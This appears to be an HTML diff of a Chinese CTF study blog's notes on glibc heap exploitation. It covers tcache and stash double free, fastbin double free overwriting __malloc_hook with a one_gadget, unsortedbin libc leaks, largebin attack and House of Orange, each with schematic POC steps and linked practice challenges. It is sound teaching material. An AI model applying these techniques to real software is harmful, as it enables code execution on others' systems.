 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> alloc(chunk0)</span><br><span class="line">   alloc(chunk1)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> free(chunk0)</span><br><span class="line">   free(chunk1)</span><br><span class="line"><span class="comment"># 做完这一步，tcachebin[size]: chunk1 -&gt; chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> edit(chunk1,payload=address_to_malloc) </span><br><span class="line"><span class="comment"># 做完这一步，tcachebin[size]: chunk1 -&gt; address_to_malloc</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> alloc(chunk2) <span class="comment"># chunk2 = chunk1</span></span><br><span class="line">   alloc(chunk3) <span class="comment"># chunk3 = address_to_malloc</span></span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>例题: </p>
+<p>例题:</p>
 </blockquote>
-<ol>
+<ol type="1">
 <li><a href="">杭电hgame2024-week2 Elden Ring Ⅱ</a></li>
 </ol>
-<h4 id="7-1-3-2-Stash-Double-Free"><a href="#7-1-3-2-Stash-Double-Free" class="headerlink" title="[7-1-3-2] Stash Double Free"></a>[7-1-3-2] Stash Double Free</h4><blockquote>
+<h4 id="stash-double-free">[7-1-3-2] Stash Double Free</h4>
+<blockquote>
 <p>Libc: 2.27 - 2.31</p>
+</blockquote>
+<blockquote>
 <p>应用条件:</p>
 </blockquote>
-<ol>
-<li><p>7个 tcachebin chunk，2个 fastbin chunk，bins 构造完成后至少可以 alloc 10次</p>
-</li>
-<li><p>free 后还能再 free 同一个 chunk</p>
-</li>
+<ol type="1">
+<li><p>7个 tcachebin chunk，2个 fastbin chunk，bins 构造完成后至少可以
+alloc 10次</p></li>
+<li><p>free 后还能再 free 同一个 chunk</p></li>
 </ol>
 <blockquote>
-<p>相关特性: </p>
+<p>相关特性:</p>
 </blockquote>
-<ol>
-<li><p>2.27之后，tcachebin 加入了 key 值检验，因此直接劫持 tcachebin 链比较困难(需要伪造 key 值)。</p>
-</li>
-<li><p>(具体是 stash 机制，我是按下面这样理解的)但当 tcachebin 某一条链的 chunk 全部取出，且对应大小的 fastbin 上仍有 chunk，ptmalloc 会将 fastbin 对应链上的全部 chunk 取出，并按 fastbin 顺序装载到 tcachebin 中。此时 ptmalloc 不会检测 fastbin 的全部 chunk 是否合法，并且 ptmalloc 还会为每个 chunk 构造合法 key 值，所以我们可以先劫持 fastbin 链，然后清空 tcachebin 后劫持 tcachebin 链。</p>
-</li>
-<li><p>在检查 key 值之后，从 tcachebin 中申请 chunk 的检测机制比较薄弱，不需要考虑 fd 指向的地址的 size 域是否合法</p>
-</li>
+<ol type="1">
+<li><p>2.27之后，tcachebin 加入了 key 值检验，因此直接劫持 tcachebin
+链比较困难(需要伪造 key 值)。</p></li>
+<li><p>(具体是 stash 机制，我是按下面这样理解的)但当 tcachebin
+某一条链的 chunk 全部取出，且对应大小的 fastbin 上仍有 chunk，ptmalloc
+会将 fastbin 对应链上的全部 chunk 取出，并按 fastbin 顺序装载到
+tcachebin 中。此时 ptmalloc 不会检测 fastbin 的全部 chunk 是否合法，并且
+ptmalloc 还会为每个 chunk 构造合法 key 值，所以我们可以先劫持 fastbin
+链，然后清空 tcachebin 后劫持 tcachebin 链。</p></li>
+<li><p>在检查 key 值之后，从 tcachebin 中申请 chunk
+的检测机制比较薄弱，不需要考虑 fd 指向的地址的 size 域是否合法</p></li>
 </ol>
 <blockquote>
 <p>POC:</p>
 </blockquote>
-<ol>
-<li><p>申请9个同样大小的 chunk，依次释放，再释放一次 chunk7</p>
- <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    alloc(i) <span class="comment"># 0-6 tcahcebin chunks || 7,8 fastbin chunks</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># fastbin: chunk7 -&gt; chunk8 -&gt; chunk7</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>申请7个 chunk，清空 tcachebin 链。再申请 chunk7，将 fastbin 中的所有 chunk 转移到 tcachebin 中.</p>
- <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    alloc(i)</span><br><span class="line"></span><br><span class="line">alloc(idx=<span class="number">7</span>,content=address_to_alloc)</span><br><span class="line"><span class="comment"># 此时 tcachebin: chunk8 -&gt; chunk7 -&gt; address_to_alloc</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>申请3个 chunk，此时我们就可以通过改变 chunk9 的值，来 write 任意位置了.</p>
- <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">7</span>)</span><br><span class="line">alloc(<span class="number">9</span>,content=anything_to_write)</span><br></pre></td></tr></table></figure>
-</li>
+<ol type="1">
+<li><p>申请9个同样大小的 chunk，依次释放，再释放一次 chunk7
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    alloc(i) <span class="comment"># 0-6 tcahcebin chunks || 7,8 fastbin chunks</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># fastbin: chunk7 -&gt; chunk8 -&gt; chunk7</span></span><br></pre></td></tr></table></figure></p></li>
+<li><p>申请7个 chunk，清空 tcachebin 链。再申请 chunk7，将 fastbin
+中的所有 chunk 转移到 tcachebin 中. <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    alloc(i)</span><br><span class="line"></span><br><span class="line">alloc(idx=<span class="number">7</span>,content=address_to_alloc)</span><br><span class="line"><span class="comment"># 此时 tcachebin: chunk8 -&gt; chunk7 -&gt; address_to_alloc</span></span><br></pre></td></tr></table></figure></p></li>
+<li><p>申请3个 chunk，此时我们就可以通过改变 chunk9 的值，来 write
+任意位置了. <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">7</span>)</span><br><span class="line">alloc(<span class="number">9</span>,content=anything_to_write)</span><br></pre></td></tr></table></figure></p></li>
 </ol>
 <blockquote>
-<p>例题: </p>
+<p>例题:</p>
 </blockquote>
-<ol>
+<ol type="1">
 <li><a href="">杭电hgame2024-week2 fastnote</a></li>
 </ol>
-<h2 id="7-2-Fastbin"><a href="#7-2-Fastbin" class="headerlink" title="[7-2] Fastbin"></a>[7-2] Fastbin</h2><h3 id="7-2-1-概述"><a href="#7-2-1-概述" class="headerlink" title="[7-2-1] 概述"></a>[7-2-1] 概述</h3><ol>
+<h2 id="fastbin">[7-2] Fastbin</h2>
+<h3 id="概述-4">[7-2-1] 概述</h3>
+<ol type="1">
 <li>Fastbin 为 LIFO 单向链表，如下</li>
 </ol>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fastbin</span>: (头节点)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">  ... -&gt; (尾节点)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
-<h3 id="7-2-2-Leak"><a href="#7-2-2-Leak" class="headerlink" title="[7-2-2] Leak"></a>[7-2-2] Leak</h3><h3 id="7-2-3-Write"><a href="#7-2-3-Write" class="headerlink" title="[7-2-3] Write"></a>[7-2-3] Write</h3><h4 id="7-2-3-1-Double-Free"><a href="#7-2-3-1-Double-Free" class="headerlink" title="[7-2-3-1] Double Free"></a>[7-2-3-1] Double Free</h4><blockquote>
+<h3 id="leak-1">[7-2-2] Leak</h3>
+<h3 id="write-1">[7-2-3] Write</h3>
+<h4 id="double-free-1">[7-2-3-1] Double Free</h4>
+<blockquote>
 <p>Libc: 2.27之前</p>
-<p>应用条件: </p>
 </blockquote>
-<ol>
+<blockquote>
+<p>应用条件:</p>
+</blockquote>
+<ol type="1">
 <li>free 后还能再 free 同一个 chunk</li>
 </ol>
 <blockquote>
 <p>fastbin 相关特性:</p>
 </blockquote>
-<ol>
-<li><p><code>free</code>: 在 free chunk 到 fastbin 的过程中，会有以下 check： </p>
-<ol>
-<li>检测这个 chunk 和尾节点是否是同一个 chunk，如果是，则触发<code>Error in &#39;./vuln&#39;: double free or corruption (fasttop): 0x17170c0</code></li>
-</ol>
-</li>
-<li><p><code>malloc</code>: 从 fastbin 申请 chunk 时，会有以下 check:  </p>
-<ol>
-<li>检测这个 chunk 的 fd 指向的内存的 size 是否符合所属 fastbin，如果不属于，则触发<code>Error in &#39;./vuln&#39;: malloc(): memory corruption (fast): 0x7f4cf12d6afe</code></li>
-</ol>
-</li>
+<ol type="1">
+<li><code>free</code>: 在 free chunk 到 fastbin 的过程中，会有以下
+check：
+<ol type="1">
+<li>检测这个 chunk 和尾节点是否是同一个
+chunk，如果是，则触发<code>Error in './vuln': double free or corruption (fasttop): 0x17170c0</code></li>
+</ol></li>
+<li><code>malloc</code>: 从 fastbin 申请 chunk 时，会有以下 check:
+<ol type="1">
+<li>检测这个 chunk 的 fd 指向的内存的 size 是否符合所属
+fastbin，如果不属于，则触发<code>Error in './vuln': malloc(): memory corruption (fast): 0x7f4cf12d6afe</code></li>
+</ol></li>
 </ol>
 <blockquote>
 <p>POC:</p>
 </blockquote>
-<ol>
-<li><p>构建 fastbin: chunk1 -&gt; chunk2 -&gt; chunk1  </p>
- <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>malloc(chunk1)，同时修改 chunk1 的 fd, 此时 fastbin 中构造为 chunk2 -&gt; chunk1 -&gt; address（address 有如下选择）  </p>
-<ol>
-<li>libc.sym[‘__malloc_hook’] - 0x23 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pd = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line"><span class="comment"># 注意不要把 &#x27;\n&#x27; 也当做 payload 传过去了</span></span><br><span class="line">alloc(<span class="number">1</span>,payload=pd)</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-</li>
-<li><p>malloc(chunk2), malloc(chunk1)</p>
- <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>malloc(address)，同时修改 address 处的内容，对应<code>&#39;2.&#39;</code>中的不同选择，有不同的填充方式  </p>
-<ol>
-<li>payload = b’a’*19 + one_gadget <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mallochook-<span class="number">0x23</span>      prev_size      <span class="number">0x000000000000007f</span></span><br><span class="line">mallochook-<span class="number">0x13</span>  <span class="number">0x6161616161616161</span> <span class="number">0x6161616161616161</span></span><br><span class="line">mallochook-<span class="number">0x03</span>  0xXXXXXXXXXX616161 0x0000000000XXXXXX</span><br><span class="line">                            ^</span><br><span class="line">                            |</span><br><span class="line">                    正好是__malloc_hook的位置</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-</li>
+<ol type="1">
+<li><p>构建 fastbin: chunk1 -&gt; chunk2 -&gt; chunk1<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>malloc(chunk1)，同时修改 chunk1 的 fd, 此时 fastbin 中构造为
+chunk2 -&gt; chunk1 -&gt; address（address 有如下选择）</p>
+<ol type="1">
+<li>libc.sym['__malloc_hook'] - 0x23 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pd = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line"><span class="comment"># 注意不要把 &#x27;\n&#x27; 也当做 payload 传过去了</span></span><br><span class="line">alloc(<span class="number">1</span>,payload=pd)</span><br></pre></td></tr></table></figure></li>
+</ol></li>
+<li><p>malloc(chunk2), malloc(chunk1) <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>malloc(address)，同时修改 address
+处的内容，对应<code>'2.'</code>中的不同选择，有不同的填充方式</p>
+<ol type="1">
+<li>payload = b'a'*19 + one_gadget <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mallochook-<span class="number">0x23</span>      prev_size      <span class="number">0x000000000000007f</span></span><br><span class="line">mallochook-<span class="number">0x13</span>  <span class="number">0x6161616161616161</span> <span class="number">0x6161616161616161</span></span><br><span class="line">mallochook-<span class="number">0x03</span>  0xXXXXXXXXXX616161 0x0000000000XXXXXX</span><br><span class="line">                            ^</span><br><span class="line">                            |</span><br><span class="line">                    正好是__malloc_hook的位置</span><br></pre></td></tr></table></figure></li>
+</ol></li>
 </ol>
 <blockquote>
 <p>例题</p>
 </blockquote>
-<ol>
-<li><p><a href="https://heygap.github.io/2023/08/14/Pwn%20-%20Practice/#more">BUUCTF babyheap_0ctf_2017</a></p>
-</li>
-<li><p><a href="">杭电hgame2024-week2 old_fastnote</a></p>
-</li>
+<ol type="1">
+<li><p><a
+href="https://heygap.github.io/2023/08/14/Pwn%20-%20Practice/#more">BUUCTF
+babyheap_0ctf_2017</a></p></li>
+<li><p><a href="">杭电hgame2024-week2 old_fastnote</a></p></li>
 </ol>
-<h2 id="7-3-Unsortedbin"><a href="#7-3-Unsortedbin" class="headerlink" title="[7-3] Unsortedbin"></a>[7-3] Unsortedbin</h2><h3 id="7-3-1-leak"><a href="#7-3-1-leak" class="headerlink" title="[7-3-1] leak"></a>[7-3-1] leak</h3><blockquote>
+<h2 id="unsortedbin">[7-3] Unsortedbin</h2>
+<h3 id="leak-2">[7-3-1] leak</h3>
+<blockquote>
 <p>Libc: Any</p>
+</blockquote>
+<blockquote>
 <p>应用条件:</p>
 </blockquote>
-<ol>
-<li><p>UAF</p>
-</li>
-<li><p>alloc 至少不会覆盖 bk</p>
-</li>
+<ol type="1">
+<li><p>UAF</p></li>
+<li><p>alloc 至少不会覆盖 bk</p></li>
 </ol>
-<p>当unsortedbin中有且仅有一个chunk时， </p>
+<p>当unsortedbin中有且仅有一个chunk时，</p>
 <p>该chunk的fd和bk会指向 &amp;main_arena + 96，</p>
 <p>貌似libc2.31是96，libc2.23是88，</p>
-<p>具体做题用 pwndbg 看最低四位是 0x8 还是 0x0，0x8-&gt;88,0x0-&gt;96</p>
-<p>而这个地址可以用ida查看对应libc的 malloc_trim 函数找到，从而帮助计算 libc_base.  </p>
-<p>当然这个地址也是 &amp;__malloc_hook + 0x10，具体看下面的代码注释.  </p>
-<p>如果我们把 unsortedbin 中唯一一个 chunk 记作 chunk0，则: </p>
+<p>具体做题用 pwndbg 看最低四位是 0x8 还是
+0x0，0x8-&gt;88,0x0-&gt;96</p>
+<p>而这个地址可以用ida查看对应libc的 malloc_trim 函数找到，从而帮助计算
+libc_base.</p>
+<p>当然这个地址也是 &amp;__malloc_hook + 0x10，具体看下面的代码注释.</p>
+<p>如果我们把 unsortedbin 中唯一一个 chunk 记作 chunk0，则:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内存中的 main_arena 地址，一般为0x7f...</span></span><br><span class="line">main_arena = chunk0.fd - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 libc 基址:</span></span><br><span class="line"><span class="comment"># main_arena 在 libc 中的偏移，正好等于 </span></span><br><span class="line"><span class="comment"># __malloc_hook 的偏移 + 0x10。</span></span><br><span class="line"><span class="comment"># 即 &amp;main_arena = &amp;__malloc_hook + 0x10。</span></span><br><span class="line">libc_base = main_arena - (ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>).sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们也可以直接用 IDA 打开 libc,</span></span><br><span class="line"><span class="comment"># 找到 __malloc_trim 函数,</span></span><br><span class="line"><span class="comment"># 直接在 22 行附近找到类似于</span></span><br><span class="line"><span class="comment"># _R15 = &amp;dword_1ECB80 的语句,</span></span><br><span class="line"><span class="comment"># 这里 main_arena 的偏移就是 0x1ECB80</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x1ECB80</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>bypass</p>
 </blockquote>
-<ol>
-<li><code>ssize_t read(int fd, void *buf, size_t nbytes)</code>会用’\x00’填充不够 nbytes 的部分，因此我们在 <code>alloc</code> 或者 <code>edit</code> 的时候注意 nbytes = 0x08 即可，这样不会覆盖 bk 的 &amp;main_arena</li>
+<ol type="1">
+<li><code>ssize_t read(int fd, void *buf, size_t nbytes)</code>会用''填充不够
+nbytes 的部分，因此我们在 <code>alloc</code> 或者 <code>edit</code>
+的时候注意 nbytes = 0x08 即可，这样不会覆盖 bk 的 &amp;main_arena</li>
 </ol>
-<h3 id="7-3-2-write"><a href="#7-3-2-write" class="headerlink" title="[7-3-2] write"></a>[7-3-2] write</h3><h4 id="7-3-2-1-Direct"><a href="#7-3-2-1-Direct" class="headerlink" title="[7-3-2-1] Direct"></a>[7-3-2-1] Direct</h4><blockquote>
+<h3 id="write-2">[7-3-2] write</h3>
+<h4 id="direct">[7-3-2-1] Direct</h4>
+<blockquote>
 <p>Libc: 2.23</p>
-<p>相关特性: </p>
 </blockquote>
-<ol>
-<li>低 libc 版本的 unsortedbin 可以像 tcachebin 一样，通过伪造链来申请一个 fake_chunk</li>
+<blockquote>
+<p>相关特性:</p>
+</blockquote>
+<ol type="1">
+<li>低 libc 版本的 unsortedbin 可以像 tcachebin
+一样，通过伪造链来申请一个 fake_chunk</li>
 </ol>
 <blockquote>
 <p>POC:</p>
 </blockquote>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初状态 unsortedbin --&gt; chunk_victim  </span></span><br><span class="line">&gt; 此时我们令chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line"><span class="comment"># 末状态 unsortedbin --&gt; chunk_victim --&gt; fake_chunk</span></span><br><span class="line">&gt; 连续申请两个chunk即可申请到fake_chunk</span><br></pre></td></tr></table></figure>
-<h2 id="7-4-Largebin-Attack"><a href="#7-4-Largebin-Attack" class="headerlink" title="[7-4] Largebin Attack"></a>[7-4] Largebin Attack</h2><h3 id="7-4-1-概述"><a href="#7-4-1-概述" class="headerlink" title="[7-4-1] 概述"></a>[7-4-1] 概述</h3><p>Largebin 是 FIFO 的双向链表，chunk 结构为👇<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------------------------+</span><br><span class="line">|        prev_size       |      size       |0|0|1|| </span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|           fd           |           bk           |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|       fd_nextsize      |       bk_nextsize      |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|                    user_data                    |</span><br><span class="line">|                      . . .                      |</span><br><span class="line">+-------------------------------------------------+</span><br></pre></td></tr></table></figure></p>
-<h3 id="7-4-2-leak"><a href="#7-4-2-leak" class="headerlink" title="[7-4-2] leak"></a>[7-4-2] leak</h3><h3 id="7-4-3-write"><a href="#7-4-3-write" class="headerlink" title="[7-4-3] write"></a>[7-4-3] write</h3><h4 id="7-4-3-1-对-libc-有要求"><a href="#7-4-3-1-对-libc-有要求" class="headerlink" title="[7-4-3-1] 对 libc 有要求"></a>[7-4-3-1] 对 libc 有要求</h4><blockquote>
+<h2 id="largebin-attack">[7-4] Largebin Attack</h2>
+<h3 id="概述-5">[7-4-1] 概述</h3>
+<p>Largebin 是 FIFO 的双向链表，chunk 结构为👇 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------------------------------+</span><br><span class="line">|        prev_size       |      size       |0|0|1|| </span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|           fd           |           bk           |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|       fd_nextsize      |       bk_nextsize      |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|                    user_data                    |</span><br><span class="line">|                      . . .                      |</span><br><span class="line">+-------------------------------------------------+</span><br></pre></td></tr></table></figure></p>
+<h3 id="leak-3">[7-4-2] leak</h3>
+<h3 id="write-3">[7-4-3] write</h3>
+<h4 id="对-libc-有要求">[7-4-3-1] 对 libc 有要求</h4>
+<blockquote>
 <p>libc: 2.30 及以前？</p>
 </blockquote>
-<h4 id="7-4-3-2-对-libc-没要求"><a href="#7-4-3-2-对-libc-没要求" class="headerlink" title="[7-4-3-2] 对 libc 没要求"></a>[7-4-3-2] 对 libc 没要求</h4><blockquote>
+<h4 id="对-libc-没要求">[7-4-3-2] 对 libc 没要求</h4>
+<blockquote>
 <p>libc: Any</p>
 </blockquote>
 <p>概述：</p>
-<p>通过修改 largebin 中的 bk_nextsize 为 target_addr - 0x20，可以在 target_addr 处写一个堆地址</p>
-<p>POC：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x500</span>)  <span class="comment">// chunk1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap1 防止合并</span></span><br><span class="line">alloc(<span class="number">0x510</span>)  <span class="comment">// chunk2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap2 防止合并</span></span><br><span class="line"><span class="built_in">free</span>(chunk1)  <span class="comment">// chunk1 进入 unsortedbin</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk1 进入 largebin</span></span><br><span class="line"><span class="built_in">free</span>(chunk2)  <span class="comment">// chunk2 进入 unsortedbin</span></span><br><span class="line">chunk1.bk_nextsize = target_addr - <span class="number">0x20</span> <span class="comment">// UAF等方法修改 chunk</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk2 进入 largebin，触发 largebin attack</span></span><br><span class="line">                        <span class="comment">// target_addr 处被写入 chunk2 的地址</span></span><br></pre></td></tr></table></figure></p>
-<h1 id="8-Series-of-House"><a href="#8-Series-of-House" class="headerlink" title="[8] Series of House"></a>[8] Series of House</h1><h2 id="8-1-House-of-Orange"><a href="#8-1-House-of-Orange" class="headerlink" title="[8-1] House of Orange"></a>[8-1] House of Orange</h2><h3 id="8-1-1-概述"><a href="#8-1-1-概述" class="headerlink" title="[8-1-1] 概述"></a>[8-1-1] 概述</h3><p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。    </p>
-<h3 id="8-1-2-伪造chunk需求"><a href="#8-1-2-伪造chunk需求" class="headerlink" title="[8-1-2] 伪造chunk需求"></a>[8-1-2] 伪造chunk需求</h3><ol>
-<li><p>top_chunk的结束地址必须页对齐  </p>
+<p>通过修改 largebin 中的 bk_nextsize 为 target_addr - 0x20，可以在
+target_addr 处写一个堆地址</p>
+<p>POC： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x500</span>)  <span class="comment">// chunk1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap1 防止合并</span></span><br><span class="line">alloc(<span class="number">0x510</span>)  <span class="comment">// chunk2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap2 防止合并</span></span><br><span class="line"><span class="built_in">free</span>(chunk1)  <span class="comment">// chunk1 进入 unsortedbin</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk1 进入 largebin</span></span><br><span class="line"><span class="built_in">free</span>(chunk2)  <span class="comment">// chunk2 进入 unsortedbin</span></span><br><span class="line">chunk1.bk_nextsize = target_addr - <span class="number">0x20</span> <span class="comment">// UAF等方法修改 chunk</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk2 进入 largebin，触发 largebin attack</span></span><br><span class="line">                        <span class="comment">// target_addr 处被写入 chunk2 的地址</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="series-of-house">[8] Series of House</h1>
+<h2 id="house-of-orange">[8-1] House of Orange</h2>
+<h3 id="概述-6">[8-1-1] 概述</h3>
+<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。</p>
+<h3 id="伪造chunk需求">[8-1-2] 伪造chunk需求</h3>
+<ol type="1">
+<li><p>top_chunk的结束地址必须页对齐</p>
 <ul>
-<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可  </li>
-</ul>
-</li>
-<li><p>top_chunk.size &gt;= MINSIZE  </p>
-</li>
-<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p>
-</li>
+<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可</li>
+</ul></li>
